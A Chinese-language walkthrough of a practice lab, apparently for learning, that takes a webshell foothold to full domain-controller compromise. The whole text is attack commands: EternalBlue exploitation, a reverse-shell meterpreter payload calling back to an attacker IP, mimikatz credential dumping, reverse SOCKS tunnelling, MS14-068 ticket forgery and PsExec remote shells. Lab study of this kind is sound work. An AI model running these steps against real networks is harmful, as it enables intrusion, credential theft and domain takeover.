Yxcms靶场 | 向内网横向移动并拿到域控

实验环境：

靶场：Windows 7  ip 192.168.100.50

 

靶场测试过程：

通过前面的获取webshell拿到web服务器权限接下来向内网横向移动并使用ms14068软件攻击域控

 

1、进行内网网段扫描探测内网主机

注意：因为socks 协议与 icmp 协议有所不同所以使用扫描敏感端口的方式进行内网探测。

使用 kali 上的 masscan 软件对 192.168.1.0/24 网段的 445，3389，80 端口进行探测

命令：proxychains nmap -sT -Pn -n -p 3389,80,445 192.168.1.107

因为实验环境知道内网主机的准确 IP 地址所以就不整个网段去进行扫描了使用代理运行 namp

-sT 使用tcp 协议

-Pn 跳过 ping 命令

-n 不使用域名解析

-p 指定端口

2、发现内网主机开放 445 端口尝试在 kali 里用永恒之蓝漏洞去攻击

打开 msf 攻击框架

命令：proxychains msfconsole

实验代理打开 msf 攻击框架


3、搜索永恒之蓝漏洞模块

命令：search ms17_010

红色标记框是永恒之蓝检漏洞测模块

黄色标记框是永恒之蓝漏洞攻击模块

4、先使用检测模块对内网主机进行漏洞检测auxiliary/scanner/smb/smb_ms17_010

命令：use auxiliary/scanner/smb/smb_ms17_010 使用漏洞检测模块

show options 查看设置参数

set rhosts 192.168.1.1047 设置检测目标

run 执行检测


5、确定有永恒之蓝漏洞使用攻击模块进行 getshell exploit/windows/smb/ms17_010_eternalblue 攻击模块

命令：use exploit/windows/smb/ms17_010_eternalblue 使用攻击模块

set payload windows/x64/meterpreter/reverse_tcp 设 置

payload show options 查看设置参数

set lhost 192.168.100.143 设置攻击者 IP 地址

set rhosts 192.168.1.107 设置目标机IP 地址

run 进行攻击

 6、获取 shell

命令：shell获取目标机的 shell

发现永痕之蓝漏洞无法获取 shell 所以我们使用木马的方式 get 目标机的shell

7、使用 msf 软件生成木马文件反弹shell 在 merterprete 先获取目标机的版本信息

命令：sysinfo

8、利用 msf 软件生成一个木马程序

命令：msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.100.143 lport=5555 -f exe -o shell.exe

9、利用 meterpreter 将木马上传到目标机内

命令：upload '/root/shell.exe'

10、在本机使用 msf 监听本机的 5555 端口接收 shell

命令：msfconsole

命令：use exploit/multi/handler 使用监听模块

set payload windows/x64/meterpreter/reverse_tcp 设 置

payload show options 查看参数

set lhost 192.168.100.143 设置攻击者IP 地址

set lport 5555 设置攻击和端口

run 开始监听

在 meterpreter 执行木马程序

命令：execute -f shell.exe

查看是否成功获取到shell

命令：shell

11、可以对目标机进行信息收集查看是否是域成员

注意：可能会出现乱码的情况

解决方式：输入命令：chcp65001

12、查看是否域内成员

命令：ipconfig /all

13、查看当前操作权限

命令：whoami

14、在确定是域内成员之后上传 mimikaz 软件进行域的 hash 获取，使用永恒之蓝漏洞 meterpretre 上传 mimikaz 软件。

命令：upload '/root/mimikatz_64.exe'

15、在 shell 执行 mimikaz 获取域 hash

命令：mimikatz_64.exe

16、开启目标机的 3389 端口然后反弹代理进行远程桌面连接

开启 3389 端口

命令：REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f

netstat –ano 查看端口

17、利用永恒之蓝漏洞 meterpre 上传ew 软件到目标机

命令：upload '/root/ew_for_Win.exe'

18、在 kali 上监听自己的 1234 端口并且转移到本机的 1060 端口

命令：cd ew/ 切换到ew 目录下

ls 列出当前目录下所有文件

./ew_for_linux64 -s rcsocks-l 1060 -e 1234

监听本机的 1234 端口并且转发到本机的 1060 端口

19、利用上传的 ew 软件将目标机的 3389 端口转发到 kali 的 1234 端口

命令：ew_for_Win.exe -s rssocks -d 192.168.100.143 -e 1234

20、因为一台 kali 不能拥有俩个代理所以在此之前将攻击域控的软件进行上传Mimikazt、s 扫描器、14068、PsExec.exe

命令：upload '/root/S.exe' 上传 s 扫描器

upload '/root/14068py.exe' 上传票据伪造工具

upload '/root/mimikatz_trunk/x64/mimikatz.exe' 上 传 mimikazt upload '/ PsExec.exe ' 上传反弹脚本软件

21、在 kali 上设置代理利用 mimikazt 获取的登陆名和密码进行进行远程登陆Kali 设置代理的路径：etc/proxychains.conf

命令：vim /etc/proxychains.conf

使用 socks5 协议监听本主机的 1060 端口

22、利用获取的 IP 地址和获取到用户名和密码进行远程连接目标机

命令：proxychains rdesktop 192.168.1.107 使用代理远程连接 19.168.1.107 用户名：test\administrator

密码：1234.com

23、对域进行信息收集查看当前权限

命令：whoami

24、获取域用户和域的 sid

命令：whoami /all

域用户 sid：S-1-5-21-3626197789-623757891-1747491499-500

域 sid：S-1-5-21-3626197789-623757891-1747491499

25、获取域名

命令：ipconfig /all  

域名：test.com

26、获取域控名称

命令：nltest /DCLIST:test.com

域控名：dc.test.com

27、使用 s 扫描器扫描域内 IP 地址

命令：cd../.. 切换到 c 盘根目录

cd windows/system32 切换到上传文件的目录下

命令：S.exe tcp 10.1.1.0 10.1.1.254 445 512

使用 s 扫描器扫描 10.1.1.0 到 10.1.1.254 开放 445 端口的 IP 线程为 512 因为靶场环境只有一台域成员主机所以我们很快就能确定这就是域控 IP 地址：10.1.1.10

28、在确定域控 IP 之后我们可以进行票据伪造的方式对域控进行攻击其实在这个靶场中我们直接就获取到了域控的权限

我采用 ms14068 的方式去伪造票据

首先利用远程管理桌面去上传文件的路径将 mimikazt 和 14068 软件移入到一个新建的文件夹 111 当中

文件默认上传路径：c:/windows/system32

查看当前用户是否已经存在票据如果存在就删除

命令：klist 查看票据

Klist purge 删除已经存在的票据

利用 14068 软件伪造票据发送票的tgt 文件

命令：cd desktop 切换到桌面

cd 111 切换到软件存放目录

14068py.exe -u administrator@test.com -p "1234.com" -s S-1-5-21-3626197789- 623757891-1747491499-500-d dc.test.com 伪造 tgt 文件

查看文件是否伪造成功

命令：dir

也可以利用远程桌面的图像化界面去查看

29、利用 mimikatz 软件进行票据伪造

命令：mimikatz.exe "kerberos::ptc TGT_administrator@test.com.ccache" exit

        ptc 参数就是 14068 生成的文件全名称 

30、查看票据是否已经存在并且使用 ipc 去远程连接

命令：klist

\\dc\c$


 

31、利用 psexec 软件去反弹域控制器的 shell

首先进入利用 kali 上传文件的目录下

路径：C:/windows/system32

命令：PsExec.exe \\10.1.1.10 -u administrator -p 1234.com

cmd IP 地址就是域控的 IP 地址
